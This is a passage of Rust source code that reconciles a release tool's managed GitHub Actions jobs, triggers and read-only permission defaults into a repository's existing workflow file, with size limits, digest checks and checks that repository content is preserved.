// ---
// relationships:
//   implements: github-release-executor
// ---

//! Syntax-aware reconciliation of Intentional-owned GitHub workflow slices.
//!
//! Intentional owns complete authority-bearing slices of a workflow without
//! owning the document. Derivation produces the required top-level entries and
//! the complete managed jobs; reconciliation splices exactly those into the
//! repository's own file, so its other triggers, jobs, comments, and metadata
//! survive untouched.
//!
//! Ownership is decided by two independent marks. A job identifier under the
//! configured prefix is reserved even when a repository chose the same name,
//! and every managed job carries the stable sentinel step id
//! [`OWNERSHIP_SENTINEL`], which identifies Intentional's own jobs across a
//! prefix change. A job under an old prefix without the sentinel was never
//! Intentional's, so it stays repository-owned.

use crate::config::{Config, GithubConfig, PrefixNamespaces, WorkflowRole};
use crate::error::{Error, Result};
use crate::executor::names;
use crate::executor::recipe::{
    resolve_publications, Packager, SelectedPublication, PRIMARY_TARGET,
};
use crate::model::{PublisherKind, TagPhase};
use crate::plan::canonical_json;
use crate::textdiff;
use crate::yaml_edit::Document;
use glob::{MatchOptions, Pattern};
use serde::Serialize;
use serde_yaml::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

mod templates;

use templates::{
    build_command, job, nfpm_toolchain_steps, render_list, toolchain_steps, OCI_TITLE_LABEL,
    PUBLISH_ASSEMBLE_JOB, PUBLISH_BUILD_JOB, PUBLISH_CLOSE_JOB, PUBLISH_HANDOFF_STEP,
    PUBLISH_PHASE_TAG_JOB, PUBLISH_PUBLISHER_JOB, PUBLISH_UPLOAD_JOB, PUBLISH_UPLOAD_STEP,
    PUBLISH_VERIFICATION_JOB, PUBLISH_VERIFY_JOB, PUBLISH_VERIFY_STEPS, RELEASE_AUTHORITY_JOB,
    RELEASE_PREPARE_JOB,
};

/// Pinned identities and the scalar renderer the recipe modules share.
///
/// The recipe steps are written beside the templates they are spliced into, so
/// they reach the same pinned Actions and the same scalar rendering through the
/// derivation module rather than through a second path into the templates.
pub(super) use templates::{
    scalar, COSIGN_INSTALLER_ACTION, GORELEASER_INSTALL_ACTION, SETUP_BUILDX_ACTION,
    SETUP_CRANE_ACTION,
};

mod build;
mod publishers;

use build::{build_environment, cargo_archive_platforms};
use publishers::publication_jobs;

/// Step id every managed job carries, independently of the configurable prefix.
pub const OWNERSHIP_SENTINEL: &str = "intentional_executor_contract";

/// Revision of the managed workflow contract this build derives.
pub const WORKFLOW_CONTRACT: &str = "github-workflow-1";

/// Published workflow-diff schema identifier.
pub const WORKFLOW_DIFF_SCHEMA: &str = "https://intentional.foo/schemas/workflow-diff/v1";

/// Largest workflow the comparison will read or propose.
///
/// `--workflow` accepts an arbitrary file and the patch is computed from a
/// quadratic line comparison, so the input is bounded rather than trusted.
/// Reconciliation applies the same bound to its output so every workflow it
/// writes remains readable by the next comparison.
const MAX_WORKFLOW_LINES: usize = 2_000;

/// GitHub `push` filter pairs whose positive and `-ignore` forms are mutually exclusive.
const PUSH_FILTER_FAMILIES: [(&str, &str); 3] = [
    ("branches", "branches-ignore"),
    ("tags", "tags-ignore"),
    ("paths", "paths-ignore"),
];

/// Largest single workflow line the comparison will read or propose.
///
/// This companion bound prevents line compaction from hiding unbounded input
/// behind the line-count limit.
const MAX_WORKFLOW_LINE_BYTES: usize = 2_048;

fn workflow_size_remedy(role: WorkflowRole) -> &'static str {
    match role {
        WorkflowRole::Release => {
            "managed release jobs share the limit with repository-owned jobs; move unrelated jobs to another workflow"
        }
        WorkflowRole::Publish => {
            "configured publications expand the managed slice; move unrelated jobs to another workflow or reduce configured publication destinations"
        }
    }
}

fn oversized_workflow_line(text: &str) -> Option<(usize, usize)> {
    text.lines().enumerate().find_map(|(index, line)| {
        (line.len() > MAX_WORKFLOW_LINE_BYTES).then_some((index + 1, line.len()))
    })
}

/// Outcome of comparing a workflow with its derived contract.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ComparisonStatus {
    /// The workflow already carries the derived contract.
    Conformant,
    /// A transformation is available and reported as a patch.
    Different,
    /// No transformation could be derived; diagnostics explain why.
    Blocked,
}

impl ComparisonStatus {
    /// Stable name used by structured results and diagnostics.
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Conformant => "conformant",
            Self::Different => "different",
            Self::Blocked => "blocked",
        }
    }
}

impl std::fmt::Display for ComparisonStatus {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter.write_str(self.as_str())
    }
}

/// One reason a comparison could not produce a transformation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct WorkflowDiagnostic {
    /// Stable machine-readable code.
    pub code: String,
    /// Human-readable explanation.
    pub message: String,
    /// Workflow location the diagnostic refers to.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
}

impl WorkflowDiagnostic {
    fn new(code: &str, message: String) -> Self {
        Self {
            code: code.to_owned(),
            message,
            path: None,
        }
    }

    fn at(code: &str, message: String, path: &str) -> Self {
        Self {
            code: code.to_owned(),
            message,
            path: Some(path.to_owned()),
        }
    }
}

/// A workflow compared with the contract Intentional derives for its role.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkflowComparison {
    /// Executor role the comparison was derived for.
    pub role: WorkflowRole,
    /// Workflow identity reported to the user.
    pub path: PathBuf,
    /// Digest of the exact bytes that were compared.
    pub input_digest: String,
    /// Comparison outcome.
    pub status: ComparisonStatus,
    /// Digest of the proposed bytes, absent when the comparison is blocked.
    pub output_digest: Option<String>,
    /// Unified patch turning the input into the proposed output.
    pub patch: String,
    /// Whether the transformation was written to the workflow.
    pub applied: bool,
    /// Reasons a blocked comparison produced no transformation, or advisories a
    /// user should read before accepting a proposed one.
    pub diagnostics: Vec<WorkflowDiagnostic>,
    /// Proposed workflow bytes.
    output: Option<String>,
    /// Exact file the comparison read.
    file: PathBuf,
}

impl WorkflowComparison {
    /// Whether the workflow already carries its derived contract.
    pub fn conforms(&self) -> bool {
        self.status == ComparisonStatus::Conformant
    }

    /// Whether a transformation would change the workflow.
    pub fn changed(&self) -> bool {
        self.status == ComparisonStatus::Different
    }

    /// Apply the proposed transformation to the exact bytes it was derived from.
    ///
    /// The workflow is re-read and its digest re-checked, so a transformation
    /// computed against bytes that have since changed is refused rather than
    /// silently overwriting the newer content.
    pub fn apply(&self) -> Result<Self> {
        let Some(output) = &self.output else {
            return Err(Error::Validation(format!(
                "the {} workflow comparison is blocked and cannot be applied",
                self.role
            )));
        };
        let path = &self.file;
        let current = std::fs::read_to_string(path).map_err(|error| Error::io(path, error))?;
        if digest(&current) != self.input_digest {
            return Err(Error::Validation(format!(
                "Workflow input digest does not match {}; recompute the transformation",
                self.path.display()
            )));
        }
        std::fs::write(path, output).map_err(|error| Error::io(path, error))?;
        Ok(Self {
            applied: true,
            ..self.clone()
        })
    }

    /// Structured result conforming to the published workflow-diff schema.
    pub fn to_json(&self) -> Result<String> {
        canonical_json(&self.structured())
    }

    fn structured(&self) -> Value {
        let mut result = serde_yaml::Mapping::new();
        let mut insert = |key: &str, value: Value| {
            result.insert(Value::String(key.to_owned()), value);
        };
        insert("$schema", Value::String(WORKFLOW_DIFF_SCHEMA.to_owned()));
        insert("contract", Value::String(WORKFLOW_CONTRACT.to_owned()));
        let mut workflow = serde_yaml::Mapping::new();
        workflow.insert(
            Value::String("kind".to_owned()),
            Value::String(self.role.to_string()),
        );
        workflow.insert(
            Value::String("path".to_owned()),
            Value::String(self.path.display().to_string()),
        );
        insert("workflow", Value::Mapping(workflow));
        insert("input-digest", Value::String(self.input_digest.clone()));
        insert("status", Value::String(self.status.to_string()));
        if self.status != ComparisonStatus::Blocked {
            insert(
                "output-digest",
                Value::String(self.output_digest.clone().unwrap_or_default()),
            );
            insert("changed", Value::Bool(self.changed()));
            insert("applied", Value::Bool(self.applied));
            insert("patch", Value::String(self.patch.clone()));
        }
        insert(
            "diagnostics",
            serde_yaml::to_value(&self.diagnostics).unwrap_or(Value::Sequence(Vec::new())),
        );
        Value::Mapping(result)
    }
}

/// Compare one configured workflow, or an explicit override, with its contract.
pub fn compare_workflow(
    root: &Path,
    role: WorkflowRole,
    workflow: Option<&Path>,
) -> Result<WorkflowComparison> {
    let config = Config::load(root)?;
    compare_configured_workflow(root, &config, role, workflow)
}

/// Compare one workflow using an already-loaded configuration.
pub fn compare_configured_workflow(
    root: &Path,
    config: &Config,
    role: WorkflowRole,
    workflow: Option<&Path>,
) -> Result<WorkflowComparison> {
    let github = config.github.as_ref().ok_or_else(|| {
        Error::Validation(
            "no github executor configuration; run intentional executor init".to_owned(),
        )
    })?;
    let relative = workflow.map_or_else(
        || github.workflow(role).path.clone(),
        std::borrow::ToOwned::to_owned,
    );
    let file = absolute(root, &relative);

    let text = match std::fs::read_to_string(&file) {
        Ok(text) => text,
        Err(error) => {
            let diagnostic = if file.exists() {
                WorkflowDiagnostic::at(
                    "workflow-unreadable",
                    format!("{} could not be read: {error}", relative.display()),
                    &relative.display().to_string(),
                )
            } else {
                WorkflowDiagnostic::at(
                    "workflow-missing",
                    format!("{} does not exist", relative.display()),
                    &relative.display().to_string(),
                )
            };
            return Ok(blocked(
                role,
                relative,
                file,
                String::new(),
                vec![diagnostic],
            ));
        }
    };
    let input_digest = digest(&text);
    let lines = text.lines().count();
    if lines > MAX_WORKFLOW_LINES {
        let diagnostic = WorkflowDiagnostic::at(
            "workflow-too-large",
            format!(
                "{} has {lines} lines; the comparison reads at most {MAX_WORKFLOW_LINES}; {}",
                relative.display(),
                workflow_size_remedy(role)
            ),
            &relative.display().to_string(),
        );
        return Ok(blocked(role, relative, file, text, vec![diagnostic]));
    }
    if let Some((line, bytes)) = oversized_workflow_line(&text) {
        let diagnostic = WorkflowDiagnostic::at(
            "workflow-line-too-long",
            format!("{} line {line} has {bytes} bytes; the comparison reads at most {MAX_WORKFLOW_LINE_BYTES} per line", relative.display()),
            &relative.display().to_string(),
        );
        return Ok(blocked(role, relative, file, text, vec![diagnostic]));
    }
    let document = match Document::parse(&text) {
        Ok(document) => document,
        Err(error) => {
            let diagnostic = WorkflowDiagnostic::new(
                "workflow-unparsable",
                format!("{} is not valid YAML: {error}", relative.display()),
            );
            return Ok(blocked(role, relative, file, text, vec![diagnostic]));
        }
    };
    let parsed = document.value()?;
    let gate_diagnostics = configured_gate_diagnostics(github, role, &parsed);
    if !gate_diagnostics.is_empty() {
        return Ok(blocked(role, relative, file, text, gate_diagnostics));
    }
    let contract = match derive_contract(root, config, github, role) {
        Ok(contract) => contract,
        Err(diagnostics) => return Ok(blocked(role, relative, file, text, diagnostics)),
    };

    let (output, diagnostics) = match reconcile(document, &contract) {
        Ok(result) => result,
        Err(diagnostic) => return Ok(blocked(role, relative, file, text, vec![diagnostic])),
    };
    let output_lines = output.lines().count();
    if output_lines > MAX_WORKFLOW_LINES {
        let diagnostic = WorkflowDiagnostic::at(
            "workflow-too-large",
            format!(
                "the derived transformation for {} has {output_lines} lines; the comparison reads at most {MAX_WORKFLOW_LINES}; {}",
                relative.display(),
                workflow_size_remedy(role)
            ),
            &relative.display().to_string(),
        );
        return Ok(blocked(role, relative, file, text, vec![diagnostic]));
    }
    if let Some((line, bytes)) = oversized_workflow_line(&output) {
        let diagnostic = WorkflowDiagnostic::at(
            "workflow-line-too-long",
            format!("the derived transformation for {} has {bytes} bytes on line {line}; the comparison reads at most {MAX_WORKFLOW_LINE_BYTES} per line", relative.display()),
            &relative.display().to_string(),
        );
        return Ok(blocked(role, relative, file, text, vec![diagnostic]));
    }
    let patch = textdiff::unified(&relative.display().to_string(), &text, &output);
    let status = if output == text {
        ComparisonStatus::Conformant
    } else {
        ComparisonStatus::Different
    };
    Ok(WorkflowComparison {
        role,
        path: relative,
        input_digest,
        status,
        output_digest: Some(digest(&output)),
        patch,
        applied: false,
        diagnostics,
        output: Some(output),
        file,
    })
}

/// Materialize a deliberately broad contract for structural test sweeps.
///
/// Catalog-wide fixtures exceed the supported workflow size by construction:
/// they combine every maintained recipe to inspect emitted syntax and safety
/// properties, not to model a repository that can apply the result. Keeping
/// this bypass inside test-support prevents those sweeps from weakening the
/// public comparison and apply boundary.
#[cfg(any(test, feature = "test-support"))]
pub(super) fn materialize_contract_for_structural_test(
    root: &Path,
    role: WorkflowRole,
) -> Result<String> {
    let config = Config::load(root)?;
    let github = config.github.as_ref().ok_or_else(|| {
        Error::Validation(
            "no github executor configuration; run intentional executor init".to_owned(),
        )
    })?;
    let workflow = github.workflow(role);
    let path = absolute(root, &workflow.path);
    let text = std::fs::read_to_string(&path).map_err(|error| Error::io(&path, error))?;
    let document = Document::parse(&text)?;
    let gate_diagnostics = configured_gate_diagnostics(github, role, &document.value()?);
    if !gate_diagnostics.is_empty() {
        return Err(Error::Validation(
            gate_diagnostics
                .iter()
                .map(|diagnostic| diagnostic.message.as_str())
                .collect::<Vec<_>>()
                .join("; "),
        ));
    }
    let contract = derive_contract(root, &config, github, role).map_err(|diagnostics| {
        Error::Validation(
            diagnostics
                .iter()
                .map(|diagnostic| diagnostic.message.as_str())
                .collect::<Vec<_>>()
                .join("; "),
        )
    })?;
    let (output, _) = reconcile(document, &contract)
        .map_err(|diagnostic| Error::Validation(diagnostic.message))?;
    std::fs::write(&path, &output).map_err(|error| Error::io(&path, error))?;
    Ok(output)
}

fn blocked(
    role: WorkflowRole,
    relative: PathBuf,
    file: PathBuf,
    text: String,
    diagnostics: Vec<WorkflowDiagnostic>,
) -> WorkflowComparison {
    WorkflowComparison {
        role,
        path: relative,
        input_digest: digest(&text),
        status: ComparisonStatus::Blocked,
        output_digest: None,
        patch: String::new(),
        applied: false,
        diagnostics,
        output: None,
        file,
    }
}

fn absolute(root: &Path, relative: &Path) -> PathBuf {
    if relative.is_absolute() {
        relative.to_owned()
    } else {
        root.join(relative)
    }
}

fn digest(text: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(text.as_bytes());
    format!("sha256:{:x}", hasher.finalize())
}

/// Configured gates are repository jobs, so derivation may only depend on
/// identifiers the compared document actually declares.
fn configured_gate_diagnostics(
    github: &GithubConfig,
    role: WorkflowRole,
    document: &Value,
) -> Vec<WorkflowDiagnostic> {
    let workflow = github.workflow(role);
    let jobs = document
        .get("jobs")
        .and_then(Value::as_mapping)
        .into_iter()
        .flat_map(|jobs| jobs.keys())
        .filter_map(Value::as_str)
        .collect::<BTreeSet<_>>();
    workflow
        .gates
        .iter()
        .filter(|gate| !jobs.contains(gate.as_str()))
        .map(|gate| {
            WorkflowDiagnostic::at(
                "configured-gate-missing",
                format!(
                    "gate {gate} is not a job in the configured {role} workflow {}",
                    workflow.path.display()
                ),
                &format!("jobs.{gate}"),
            )
        })
        .collect()
}

/// Top-level entries and managed jobs Intentional owns in one workflow.
#[derive(Debug, Clone, PartialEq, Eq)]
struct WorkflowContract {
    namespaces: PrefixNamespaces,
    /// Trigger entries that must exist under `on`.
    triggers: Vec<(Vec<String>, Value)>,
    /// Owned release concurrency policy.
    concurrency: Value,
    /// Managed jobs in derivation order.
    jobs: Vec<(String, Value)>,
}

/// Apply a contract to a repository-owned workflow document.
///
/// Returns the proposed bytes and any advisory diagnostic the user should read
/// before accepting them.
fn reconcile(
    mut document: Document,
    contract: &WorkflowContract,
) -> std::result::Result<(String, Vec<WorkflowDiagnostic>), WorkflowDiagnostic> {
    let mut advisories = Vec::new();
    // `on: push`, `on: [push, tag]`, a null `push:` entry, and an empty `push: {}`
    // filter mapping are shorthand for a trigger mapping. Expanding them first
    // means adding a required trigger never discards the repository's own.
    if let Some(current) = document.get(&["on"]).map_err(unparsable)? {
        if let Some(expanded) = expanded_triggers(&current, contract) {
            document.set(&["on"], &expanded).map_err(unparsable)?;
        }
    }
    // Preservation is proved against the expanded form, so the shorthand path
    // is covered by the same check as every other trigger rather than skipped
    // for not being a mapping.
    let input = document.value().map_err(unparsable)?;
    for (path, required) in &contract.triggers {
        let path = path.iter().map(String::as_str).collect::<Vec<_>>();
        let current = document.get(&path).map_err(unparsable)?;
        if let Some(value) = trigger_update(current.as_ref(), required)
            .map_err(|()| invalid_trigger_filter_shape(&path.join(".")))?
        {
            document
                .set_before(&path, &value, "jobs")
                .map_err(unparsable)?;
        }
    }
    if document.get(&["concurrency"]).map_err(unparsable)?.as_ref() != Some(&contract.concurrency) {
        document
            .set_before(&["concurrency"], &contract.concurrency, "jobs")
            .map_err(unparsable)?;
    }
    // A managed publisher job's probe inherits a fixed set of process
    // variables and clears everything else, and those members carry the
    // runner's values -- the executable search path and the toolchain roots
    // through which a client is found. A workflow-level `env:` applies to every
    // job in the workflow, managed ones included, so a repository declaring one
    // of those names would choose the client that answers a probe whose answer
    // gates a long-lived credential. Refusing is not a denylist of dangerous
    // keys: it is the exact complement of the inherited set, so the two cannot
    // drift, and it is what makes calling that set the runner's contract true
    // rather than hopeful.
    if let Some(declared) = document.get(&["env"]).map_err(unparsable)? {
        if let Some(mapping) = declared.as_mapping() {
            for name in crate::executor::steps::INHERITED_ENVIRONMENT {
                if mapping.contains_key(Value::String(name.to_owned())) {
                    return Err(WorkflowDiagnostic::at(
                        "inherited-environment-declared",
                        format!(
                            "the workflow declares {name} at the top level, which applies to every managed job; a maintained recipe's probe inherits {name} from the runner to find its client, so a workflow-level value would choose the client that decides whether a first publication reaches a bootstrap credential"
                        ),
                        &format!("env.{name}"),
                    ));
                }
            }
        }
    }
    let permissions = document.get(&["permissions"]).map_err(unparsable)?;
    if !read_only_permissions(permissions.as_ref()) {
        // Intentional owns the safe default, but narrowing a grant the
        // repository's own jobs may depend on is not something to do silently.
        let narrowed = narrowed_scopes(permissions.as_ref());
        if !narrowed.is_empty() {
            advisories.push(WorkflowDiagnostic::at(
                "permissions-narrowed",
                format!(
                    "the safe top-level permission default drops the workflow-level {}; any repository-owned job relying on {} must declare it per job",
                    narrowed.join(", "),
                    if narrowed.len() == 1 { "it" } else { "them" }
                ),
                "permissions",
            ));
        }
        document
            .set_before(&["permissions"], &read_only_default(), "jobs")
            .map_err(unparsable)?;
    }

    // Jobs are independent of one another, so one parse serves every job
    // decision this reconciliation makes.
    let jobs = document
        .get(&["jobs"])
        .map_err(unparsable)?
        .and_then(|jobs| jobs.as_mapping().cloned())
        .unwrap_or_default();
    let managed = contract
        .jobs
        .iter()
        .map(|(id, _)| id.clone())
        .collect::<BTreeSet<_>>();
    for job in owned_jobs(&jobs, &contract.namespaces) {
        if !managed.contains(&job) {
            document.remove(&["jobs", &job]).map_err(unparsable)?;
        }
    }
    for (id, body) in &contract.jobs {
        if jobs.get(Value::String(id.clone())) != Some(body) {
            document
                .set(&["jobs", id.as_str()], body)
                .map_err(unparsable)?;
        }
    }

    let output = document.into_text();
    // Well-formed YAML is not proof that the transformation carries the
    // contract, so the proposed bytes are read back and checked against it the
    // way configuration edits are checked against their validated model.
    let parsed: Value = serde_yaml::from_str(&output).map_err(|error| {
        WorkflowDiagnostic::new(
            "transformation-invalid",
            format!("the derived transformation is not valid YAML: {error}"),
        )
    })?;
    validate_trigger_filters(&parsed, contract)?;
    carries_contract(&parsed, contract)?;
    preserves_repository_content(&input, &parsed, contract)?;
    Ok((output, advisories))
}

/// Prove the proposed bytes carry every part of the derived contract.
fn carries_contract(
    parsed: &Value,
    contract: &WorkflowContract,
) -> std::result::Result<(), WorkflowDiagnostic> {
    let invalid = |location: &str| {
        WorkflowDiagnostic::at(
            "transformation-invalid",
            "the derived transformation does not carry the contract".to_owned(),
            location,
        )
    };
    for (path, required) in &contract.triggers {
        let mut current = Some(parsed);
        for segment in path {
            current = current.and_then(|value| value.get(segment.as_str()));
        }
        if trigger_update(current, required)
            .map_err(|()| invalid_trigger_filter_shape(&path.join(".")))?
            .is_some()
        {
            return Err(invalid(&path.join(".")));
        }
    }
    if parsed.get("concurrency") != Some(&contract.concurrency) {
        return Err(invalid("concurrency"));
    }
    if !read_only_permissions(parsed.get("permissions")) {
        return Err(invalid("permissions"));
    }
    for (id, body) in &contract.jobs {
        if parsed.get("jobs").and_then(|jobs| jobs.get(id.as_str())) != Some(body) {
            return Err(invalid(&format!("jobs.{id}")));
        }
    }
    Ok(())
}

/// Prove the proposed bytes still carry everything the contract does not own.
///
/// The contract check proves what Intentional put in; this proves what the
/// repository already had is still there. A splice that damages a
/// repository-owned job while leaving the managed jobs intact satisfies the
/// first check and fails this one, which is what turns that class of defect
/// into a named refusal instead of silent damage.
fn preserves_repository_content(
    input: &Value,
    output: &Value,
    contract: &WorkflowContract,
) -> std::result::Result<(), WorkflowDiagnostic> {
    let discarded = |location: &str| {
        WorkflowDiagnostic::at(
            "transformation-invalid",
            "the derived transformation discards repository-owned content".to_owned(),
            location,
        )
    };
    let Some(top_level) = input.as_mapping() else {
        return Ok(());
    };
    for (key, value) in top_level {
        let Some(key) = key.as_str() else { continue };
        match key {
            // Intentional owns the concurrency policy and the permission
            // default outright, and both are proved by the contract check.
            "concurrency" | "permissions" => {}
            "on" => {
                let Some(triggers) = value.as_mapping() else {
                    continue;
                };
                let emitted = output.get("on");
                for (trigger, configured) in triggers {
                    let Some(trigger) = trigger.as_str() else {
                        continue;
                    };
                    let owned_fields = contract
                        .triggers
                        .iter()
                        .filter(|(path, _)| path.get(1).is_some_and(|owned| owned == trigger))
                        .filter_map(|(path, _)| path.get(2).cloned())
                        .collect::<BTreeSet<_>>();
                    let owns_trigger = contract.triggers.iter().any(|(path, _)| {
                        path.get(1).is_some_and(|owned| owned == trigger) && path.len() == 2
                    });
                    if owns_trigger {
                        continue;
                    }
                    let proposed = emitted.and_then(|on| on.get(trigger));
                    if owned_fields.is_empty() {
                        if proposed == Some(configured) {
                            continue;
                        }
                        return Err(discarded(&format!("on.{trigger}")));
                    }
                    let Some(configured) = configured.as_mapping() else {
                        return Err(discarded(&format!("on.{trigger}")));
                    };
                    let Some(proposed) = proposed.and_then(Value::as_mapping) else {
                        return Err(discarded(&format!("on.{trigger}")));
                    };
                    for (field, configured) in configured {
                        let Some(field) = field.as_str() else {
                            continue;
                        };
                        let proposed = proposed.get(Value::String(field.to_owned()));
                        let preserved = if owned_fields.contains(field) {
                            match (
                                configured.as_sequence(),
                                proposed.and_then(Value::as_sequence),
                            ) {
                                (Some(configured), Some(proposed)) => {
                                    configured.iter().all(|value| proposed.contains(value))
                                }
                                _ => proposed == Some(configured),
                            }
                        } else {
                            proposed == Some(configured)
                        };
                        if !preserved {
                            return Err(discarded(&format!("on.{trigger}.{field}")));
                        }
                    }
                }
            }
            "jobs" => {
                let Some(jobs) = value.as_mapping() else {
                    continue;
                };
                let managed = contract
                    .jobs
                    .iter()
                    .map(|(id, _)| id.clone())
                    .collect::<BTreeSet<_>>();
                let reserved = owned_jobs(jobs, &contract.namespaces)
                    .into_iter()
                    .collect::<BTreeSet<_>>();
                let emitted = output.get("jobs");
                for (id, job) in jobs {
                    let Some(id) = id.as_str() else { continue };
                    // A reserved job is Intentional's to replace or retire.
                    if managed.contains(id) || reserved.contains(id) {
                        continue;
                    }
                    if emitted.and_then(|jobs| jobs.get(id)) != Some(job) {
                        return Err(discarded(&format!("jobs.{id}")));
                    }
                }
            }
            _ => {
                if output.get(key) != Some(value) {
                    return Err(discarded(key));
                }
            }
        }
    }
    Ok(())
}

/// Scopes an existing permission block grants beyond read-only.
fn narrowed_scopes(permissions: Option<&Value>) -> Vec<String> {
    match permissions {
        Some(Value::Mapping(mapping)) => mapping
            .iter()
            .filter(|(_, value)| !matches!(value.as_str(), Some("read" | "none")))
            .filter_map(|(scope, value)| Some(format!("{}: {}", scope.as_str()?, value.as_str()?)))
            .collect(),
        Some(Value::String(scope)) => vec![format!("permissions: {scope}")],
        _ => Vec::new(),
    }
}

fn unparsable(error: Error) -> WorkflowDiagnostic {
    WorkflowDiagnostic::new(
        "workflow-unparsable",
        format!("the workflow could not be reconciled: {error}"),
    )
}

/// Expand shorthand trigger syntax into the equivalent mapping.
fn expanded_triggers(current: &Value, contract: &WorkflowContract) -> Option<Value> {
    let adds_push_tag_filter = contract
        .triggers
        .iter()
        .any(|(path, _)| path.as_slice() == ["on", "push", "tags"]);
    if let Value::Mapping(current) = current {
        let push = Value::String("push".to_owned());
        if adds_push_tag_filter
            && current
                .get(&push)
                .is_some_and(push_mapping_needs_branch_expansion)
        {
            let mut mapping = current.clone();
            let mut filters = current
                .get(&push)
                .and_then(Value::as_mapping)
                .cloned()
                .unwrap_or_default();
            filters.insert(
                Value::String("branches".to_owned()),
                Value::Sequence(vec![Value::String("**".to_owned())]),
            );
            mapping.insert(push, Value::Mapping(filters));
            return Some(Value::Mapping(mapping));
        }
        return None;
    }
    let names = match current {
        Value::String(name) => vec![name.clone()],
        Value::Sequence(names) => names
            .iter()
            .map(|name| name.as_str().map(str::to_owned))
            .collect::<Option<Vec<_>>>()?,
        _ => return None,
    };
    let mut mapping = serde_yaml::Mapping::new();
    for name in names {
        let value = if name == "push" && adds_push_tag_filter {
            // `on: push` means every branch and tag push. Adding a `tags`
            // filter alone would silently remove every branch push, so spell
            // the shorthand's branch half explicitly before adding the owned
            // release-tag patterns.
            all_branch_pushes()
        } else {
            Value::Null
        };
        mapping.insert(Value::String(name), value);
    }
    Some(Value::Mapping(mapping))
}

fn push_mapping_needs_branch_expansion(value: &Value) -> bool {
    value.is_null()
        || value.as_mapping().is_some_and(|mapping| {
            PUSH_FILTER_FAMILIES
                .iter()
                .flat_map(|(include, exclude)| [include, exclude])
                .all(|filter| !mapping.contains_key(Value::String((*filter).to_owned())))
        })
}

fn all_branch_pushes() -> Value {
    let mut push = serde_yaml::Mapping::new();
    push.insert(
        Value::String("branches".to_owned()),
        Value::Sequence(vec![Value::String("**".to_owned())]),
    );
    Value::Mapping(push)
}

/// The value a trigger entry needs, or `None` when the repository already satisfies it.
///
/// An error means the existing value cannot carry the required filter shape.
fn trigger_update(
    current: Option<&Value>,
    required: &Value,
) -> std::result::Result<Option<Value>, ()> {
    match (current, required) {
        (None, _) => Ok(Some(required.clone())),
        // Additional repository patterns are preserved; missing owned patterns
        // are appended in their contract order.
        (Some(Value::Sequence(present)), Value::Sequence(needed)) => {
            let mut merged = present.clone();
            let exclusions = needed
                .iter()
                .filter(|pattern| {
                    pattern
                        .as_str()
                        .is_some_and(|pattern| pattern.starts_with('!'))
                })
                .cloned()
                .collect::<Vec<_>>();
            for pattern in needed
                .iter()
                .filter(|pattern| !exclusions.contains(pattern))
            {
                if !merged.contains(pattern) {
                    merged.push(pattern.clone());
                }
            }
            // GitHub evaluates `!` patterns in order. Repeat an owned phase
            // exclusion only when it is absent or a later positive pattern can
            // re-enable the phase tag. Existing repository order stays exact.
            for exclusion in exclusions {
                if !effective_exclusion(&merged, &exclusion) {
                    merged.push(exclusion);
                }
            }
            Ok((merged != *present).then_some(Value::Sequence(merged)))
        }
        (Some(_), Value::Sequence(_)) => Err(()),
        (Some(_), _) => Ok(None),
    }
}

/// Whether an exact exclusion remains in force after every later pattern.
fn effective_exclusion(patterns: &[Value], exclusion: &Value) -> bool {
    patterns
        .iter()
        .rposition(|pattern| pattern == exclusion)
        .is_some_and(|position| {
            patterns[position + 1..].iter().all(|pattern| {
                pattern
                    .as_str()
                    .is_some_and(|pattern| pattern.starts_with('!'))
            })
        })
}

fn invalid_trigger_filter_shape(path: &str) -> WorkflowDiagnostic {
    WorkflowDiagnostic::at(
        "trigger-filter-shape-invalid",
        format!("GitHub requires {path} to be a sequence of string patterns"),
        path,
    )
}

/// Validate the filter combinations GitHub accepts for the event Intentional extends.
fn validate_trigger_filters(
    parsed: &Value,
    contract: &WorkflowContract,
) -> std::result::Result<(), WorkflowDiagnostic> {
    let Some(push) = parsed
        .get("on")
        .and_then(|triggers| triggers.get("push"))
        .and_then(Value::as_mapping)
    else {
        return Ok(());
    };
    for (include, exclude) in PUSH_FILTER_FAMILIES {
        for filter in [include, exclude] {
            if let Some(value) = push.get(Value::String(filter.to_owned())) {
                if !value
                    .as_sequence()
                    .is_some_and(|patterns| patterns.iter().all(|pattern| pattern.is_string()))
                {
                    return Err(invalid_trigger_filter_shape(&format!("on.push.{filter}")));
                }
            }
        }
        if push.contains_key(Value::String(include.to_owned()))
            && push.contains_key(Value::String(exclude.to_owned()))
        {
            return Err(WorkflowDiagnostic::at(
                "trigger-filter-conflict",
                format!(
                    "GitHub does not allow on.push.{include} and on.push.{exclude} in the same event filter; keep one form"
                ),
                &format!("on.push.{include}"),
            ));
        }
        if push
            .get(Value::String(include.to_owned()))
            .and_then(Value::as_sequence)
            .is_some_and(|patterns| {
                !patterns.is_empty()
                    && patterns.iter().all(|pattern| {
                        pattern
                            .as_str()
                            .is_some_and(|pattern| pattern.starts_with('!'))
                    })
            })
        {
            return Err(WorkflowDiagnostic::at(
                "trigger-filter-positive-missing",
                format!(
                    "GitHub requires on.push.{include} to contain a positive pattern when it uses ! exclusions; add one positive pattern or use on.push.{exclude}"
                ),
                &format!("on.push.{include}"),
            ));
        }
    }
    let owns_publish_tags = contract
        .triggers
        .iter()
        .any(|(path, _)| path.iter().map(String::as_str).eq(["on", "push", "tags"]));
    if owns_publish_tags {
        for filter in ["paths", "paths-ignore"] {
            if push.contains_key(Value::String(filter.to_owned())) {
                return Err(WorkflowDiagnostic::at(
                    "trigger-filter-conflict",
                    format!(
                        "GitHub combines on.push.{filter} with Intentional's release-tag filter, so path selection can silently suppress publication; move path-filtered jobs to another workflow"
                    ),
                    &format!("on.push.{filter}"),
                ));
            }
        }
    }
    Ok(())
}

/// Evaluate GitHub's ordered positive and `!`-negative tag filter patterns.
fn github_tag_filters_match(patterns: &[Value], tag: &str) -> bool {
    let options = MatchOptions {
        case_sensitive: true,
        require_literal_separator: true,
        require_literal_leading_dot: false,
    };
    let mut included = false;
    for pattern in patterns.iter().filter_map(Value::as_str) {
        let (negative, pattern) = pattern
            .strip_prefix('!')
